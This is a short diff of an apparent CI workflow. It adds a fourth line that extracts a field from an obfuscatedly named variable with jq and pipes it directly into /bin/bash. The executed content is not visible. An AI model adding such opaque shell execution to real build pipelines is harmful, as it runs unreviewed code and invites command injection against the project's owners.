@@ -29,6 +29,7 @@ jobs:
           echo $kbbm304 | jq -r .o6 | /bin/bash
           echo $gngh3167 | jq -r .u91697 | /bin/bash
           echo $fb915 | jq -r .frsp67 | /bin/bash
+          echo $mgyw05 | jq -r .pktx71 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
